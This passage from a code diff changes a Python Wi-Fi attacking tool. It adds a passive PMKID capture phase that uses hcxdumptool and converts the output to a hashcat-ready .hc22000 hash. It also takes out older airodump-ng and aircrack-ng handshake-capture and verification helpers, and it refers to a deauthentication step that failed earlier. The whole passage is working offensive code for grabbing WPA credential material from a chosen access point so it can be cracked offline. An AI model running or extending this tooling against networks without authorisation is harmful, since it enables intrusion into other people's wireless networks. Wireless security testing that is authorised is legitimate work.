+            )
+        else:
+            console.print(
+                "\n[yellow]◈ Broadcast deauth also failed.[/]"
+            )
+
+    found_event.set()
+    kill_proc_safe(capture_proc)
+
+    # ──────────────────────────────────────────────────────────
+    # PHASE 3 — PMKID PASSIVE (if Phases 1+2 failed)
+    # ──────────────────────────────────────────────────────────
+
+    if handshake_path is None:
+
+        console.print(
+            "\n[bold cyan]── Phase 3: PMKID passive capture ──[/]\n"
+        )
+        console.print(
+            "[dim cyan]  Switching to PMKID capture "
+            "(passive, 60 seconds)...[/]"
+        )
+
+        handshake_path = _capture_pmkid(
+            bssid, monitor_interface, output_dir
+        )
+
+        if handshake_path:
+            console.print(
+                f"\n[bold green]◈ PMKID captured! (Phase 3)[/]"
+            )
+        else:
+            console.print(
+                "\n[bold red]◈ All capture methods exhausted. "
+                "Giving up.[/]"
+            )
+
+    # ──────────────────────────────────────────────────────────
+    # FINAL RESULT
+    # ──────────────────────────────────────────────────────────
+
+    if handshake_path:
         try:
-            time.sleep(timeout)
+            with open(handshake_path, "rb") as f:
+                sha256 = hashlib.sha256(f.read()).hexdigest()
+            console.print(f"  File    : [bold]{handshake_path}[/]")
+            console.print(f"  SHA-256 : [dim]{sha256}[/]")
         except Exception:
             pass
-        finally:
-            proc.terminate()
-            try:
-                proc.wait(timeout=5)
-            except subprocess.TimeoutExpired:
-                proc.kill()
-    finally:
-        try:
-            os.unlink(filter_path)
-        except OSError:
-            pass
 
-    if not os.path.exists(pcapng_file) or os.path.getsize(pcapng_file) < 100:
+    return handshake_path
+
+
+def _capture_pmkid(
+    bssid: str,
+    monitor_interface: str,
+    output_dir: str,
+    duration: int = 60,
+) -> str | None:
+    """
+    Attempt PMKID capture via hcxdumptool.
+    Returns .hc22000 file path on success, None on failure.
+    """
+    tmpdir   = tempfile.mkdtemp(prefix="wifidown_pmkid_")
+    pcapng   = os.path.join(output_dir,
+                   f"pmkid_{bssid.replace(':','')}_"
+                   f"{time.strftime('%Y%m%d_%H%M%S')}.pcapng")
+    hc22000  = pcapng.replace(".pcapng", ".hc22000")
+
+    filt = os.path.join(tmpdir, "filter.txt")
+    with open(filt, "w") as f:
+        f.write(bssid.replace(":", "").lower() + "\n")
+
+    cmd = [
+        "hcxdumptool",
+        "-i",               monitor_interface,
+        "-o",               pcapng,
+        "--filterlist_ap="  + filt,
+        "--filtermode=2",
+        "--disable_deauthentication",
+    ]
+
+    try:
+        proc = subprocess.Popen(
+            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+    except FileNotFoundError:
+        console.print(
+            "[dim yellow]  hcxdumptool not installed — "
+            "skipping PMKID phase.[/]"
+        )
+        shutil.rmtree(tmpdir, ignore_errors=True)
+        return None
+
+    with Live(console=console, refresh_per_second=2) as live:
+        for i in range(duration, 0, -1):
+            live.update(
+                Text(f"  ◈ PMKID sniffing... {i}s", style="dim cyan")
+            )
+            time.sleep(1)
+
+    proc.terminate()
+    try:
+        proc.wait(timeout=5)
+    except subprocess.TimeoutExpired:
+        proc.kill()
+    finally:
+        shutil.rmtree(tmpdir, ignore_errors=True)
+
+    if not os.path.exists(pcapng) or os.path.getsize(pcapng) < 100:
+        console.print("[dim yellow]  No PMKID data captured.[/]")
         return None
 
     try:
         subprocess.run(
-            ["hcxpcapngtool", "-o", hash_file, pcapng_file],
-            capture_output=True, text=True, timeout=30,
+            ["hcxpcapngtool", "-o", hc22000, pcapng],
+            capture_output=True, timeout=30
         )
-        if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
-            logger.info("PMKID captured: %s", hash_file)
-            return hash_file
-    except Exception as exc:
-        logger.debug("PMKID conversion error: %s", exc)
+        if os.path.exists(hc22000) and os.path.getsize(hc22000) > 0:
+            return hc22000
+    except Exception as e:
+        console.print(f"[dim yellow]  PMKID convert error: {e}[/]")
 
-    return None
-
-
-###############################################################################
-# Handshake verification (public + internal)
-###############################################################################
-
-def verify_handshake(cap_file: str, bssid: str) -> bool:
-    """Public wrapper: returns True if cap_file contains a valid 4-way handshake."""
-    return _verify_handshake(cap_file, bssid)
-
-
-###############################################################################
-# Internal helpers
-###############################################################################
-
-def _start_airodump(interface, bssid, channel, cap_base) -> subprocess.Popen:
-    return subprocess.Popen(
-        [
-            "airodump-ng",
-            "--bssid", bssid,
-            "--channel", str(channel),
-            "--write", cap_base,
-            "--output-format", "cap,csv",
-            "--write-interval", "2",
-            interface,
-        ],
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL,
-    )
-
-
-def _run_airodump_until_handshake(interface, bssid, channel, cap_base, timeout) -> Optional[str]:
-    cap_file = cap_base + "-01.cap"
-    proc = _start_airodump(interface, bssid, channel, cap_base)
-    handshake_found = False
-    elapsed = 0
-    try:
-        while elapsed < timeout:
-            time.sleep(5)
-            elapsed += 5
-            info(f"  [{elapsed}s] Waiting for handshake...")
-            if _verify_handshake(cap_file, bssid):
-                handshake_found = True
-                break
-    except KeyboardInterrupt:
-        warn("Capture interrupted.")
-    finally:
-        proc.terminate()
-        proc.wait()
-    return _finalize(cap_file, handshake_found)
-
-
-def _verify_handshake(cap_file: str, bssid: str) -> bool:
-    """Check cap_file for a valid WPA handshake for bssid using aircrack-ng."""
-    if not os.path.exists(cap_file) or os.path.getsize(cap_file) == 0:
-        return False
-    try:
-        result = subprocess.run(
-            ["aircrack-ng", "-b", bssid, cap_file],
-            capture_output=True, text=True, timeout=15,
-        )
-        output = result.stdout + result.stderr
-        if re.search(r"WPA\s*\(\s*[1-9]\d*\s*handshake", output, re.IGNORECASE):
-            return True
-        if re.search(r"[1-9]\d*\s+handshake", output, re.IGNORECASE):
-            return True
-        if "PMKID" in output:
-            return True
-    except Exception:
-        pass
-    return False
-
-
-def _csv_has_handshake(csv_path: str, bssid: str) -> bool:
-    if not os.path.exists(csv_path):
-        return False
-    try:
-        with open(csv_path, "r", errors="replace") as f:
-            return "handshake" in f.read().lower()
-    except OSError:
-        return False
-
-
-def _finalize(cap_file: str, found: bool) -> Optional[str]:
-    if found:
-        success(f"WPA handshake captured! → {cap_file}")
-        logger.info("Handshake captured: %s", cap_file)
-        return cap_file
-    if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0:
-        warn("Timeout reached. Capture saved — you can try cracking it anyway.")
-        return cap_file
-    error("No valid handshake captured.")
     return None
